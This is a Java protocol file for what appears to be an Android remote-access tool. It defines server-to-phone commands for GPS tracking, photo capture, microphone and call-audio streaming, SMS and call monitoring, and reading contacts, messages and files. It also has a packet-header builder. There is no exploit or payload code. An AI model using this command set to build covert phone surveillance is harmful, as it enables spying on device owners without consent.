package inout;

import java.nio.ByteBuffer;

public class Protocol {
	
	public final static int HEADER_LENGTH_DATA = 15;
	public final static int MAX_PACKET_SIZE = 2048;
	
	public final static int PACKET_LOST = 0 ;
	public final static int NO_MORE = 1;
	public final static int SIZE_ERROR = 2;
	public final static int ALL_DONE = 3 ;
	public final static int PACKET_DONE = 4 ;
	

	//--- Commande de connexion ---	
	public final static short DEBUG = 0;
	public final static short ERROR = 1;
	public final static short CONNECT = 2;
	public final static short ENVOI_CMD = 3;
	public final static short INFOS = 4;
	public final static short DISCONNECT = 5;

	//--- Commandes de Pr�f�rences ---
	public final static short SET_PREFERENCE	= (short)  20 ;
	public final static short GET_PREFERENCE	= (short)  21 ;
	
	//--- Instruction Server -> Client(Telephone)
	private static short P_INST = 100;
	public final static short GET_GPS = (short) (P_INST + 0);
	public final static short GET_GPS_STREAM = (short) (P_INST + 1); //String du Provider
	public final static short STOP_GPS_STREAM = (short) (P_INST + 2); // -
	
	public final static short GET_PICTURE = (short) (P_INST + 3); // -
	
	public final static short GET_SOUND_STREAM = (short) (P_INST + 4); // Int source
	public final static short STOP_SOUND_STREAM = (short) (P_INST + 5); // -
	
	public final static short GET_VIDEO_STREAM = (short) (P_INST + 6); // Int source (pour api 8+)
	public final static short STOP_VIDEO_STREAM = (short) (P_INST + 7);
	
	public final static short GET_BASIC_INFO = (short) (P_INST + 8); // -
	public final static short DO_TOAST  = (short) (P_INST + 9); // String text
	public final static short MONITOR_SMS = (short) (P_INST + 10); // filter (phone number) or (incoming/outgoing) ?
	public final static short MONITOR_CALL = (short) (P_INST + 11); // idem
	public final static short GET_CONTACTS = (short) (P_INST + 12); // filter sim/phone ?
	public final static short GET_SMS = (short) (P_INST + 13); // filter (phone number) or (read/unread) or (received/sent)
	public final static short LIST_DIR = (short) (P_INST + 14); // String path
	public final static short GET_FILE = (short) (P_INST + 15); // String path
	public final static short GIVE_CALL = (short) (P_INST + 16);//String phonenumber
	public final static short SEND_SMS = (short) (P_INST + 17); // String phonenumber, String message
	public final static short GET_CALL_LOGS = (short) (P_INST + 18); // -
	public final static short STOP_MONITOR_SMS = (short) (P_INST + 19); // -
	public final static short STOP_MONITOR_CALL = (short) (P_INST + 20); // -
	public final static short GET_ADV_INFORMATIONS = (short) (P_INST + 21); // -
	public final static short OPEN_BROWSER = (short) (P_INST + 22); // String url
	public final static short DO_VIBRATE = (short) (P_INST + 23); // long millisec
	// email ?
	
	//--- Reponse Client -> Server
	private static short P_REP = 200;
	public final static short DATA_GPS = (short) (P_REP + 0);
	public final static short DATA_GPS_STREAM = (short) (P_REP + 1);
	public final static short DATA_PICTURE = (short) (P_REP + 2);
	public final static short DATA_SOUND_STREAM = (short) (P_REP + 3);
	public final static short DATA_VIDEO_STREAM = (short) (P_REP + 4);
	public final static short DATA_BASIC_INFO = (short) (P_REP + 5);
	public final static short ACK_TOAST = (short) (P_REP + 6);
	public final static short DATA_MONITOR_SMS = (short) (P_REP + 7);
	public final static short DATA_MONITOR_CALL = (short) (P_REP + 8);
	public final static short DATA_CONTACTS = (short) (P_REP + 9);
	public final static short DATA_SMS = (short) (P_REP + 10);
	public final static short DATA_LIST_DIR = (short) (P_REP + 11);
	public final static short DATA_FILE = (short) (P_REP + 12);
	public final static short ACK_GIVE_CALL = (short) (P_REP + 13);
	public final static short ACK_SEND_SMS = (short) (P_REP + 14);
	public final static short DATA_CALL_LOGS = (short) (P_REP + 15);
	
	
	public final static int ARG_STREAM_AUDIO_MIC = 1; 
	public final static int ARG_STREAM_AUDIO_UPDOWN_CALL = 4; 
	public final static int ARG_STREAM_AUDIO_UP_CALL = 2; 
	public final static int ARG_STREAM_AUDIO_DOWN_CALL = 3; 
	
	public final static String KEY_SEND_SMS_NUMBER = "number";
	public final static String KEY_SEND_SMS_BODY = "body";
	
	
	public static byte[] dataHeaderGenerator(int totalLenght, int localLength, boolean moreF, short idPaquet, int channel) 
	{
		byte[] byteTotalLength = ByteBuffer.allocate(4).putInt(totalLenght).array();
		byte[] byteLocalLength = ByteBuffer.allocate(4).putInt(localLength).array();
		byte[] byteMoreF = new byte[1] ;
		if(moreF) byteMoreF[0] = 1;
		else byteMoreF[0] = 0;
		byte[] bytePointeurData = ByteBuffer.allocate(2).putShort(idPaquet).array();
		byte[] byteChannel = ByteBuffer.allocate(4).putInt(channel).array();
		
		byte[] header = new byte[HEADER_LENGTH_DATA];
		
		System.arraycopy(byteTotalLength, 0, header, 0, byteTotalLength.length);
		System.arraycopy(byteLocalLength, 0, header, byteTotalLength.length, byteLocalLength.length);
		System.arraycopy(byteMoreF, 0, header, byteTotalLength.length+byteLocalLength.length, byteMoreF.length);
		System.arraycopy(bytePointeurData, 0, header, byteTotalLength.length+byteLocalLength.length+byteMoreF.length, bytePointeurData.length);
		System.arraycopy(byteChannel, 0, header, byteTotalLength.length+byteLocalLength.length+byteMoreF.length+bytePointeurData.length, byteChannel.length);
		
		return header;
	}
}

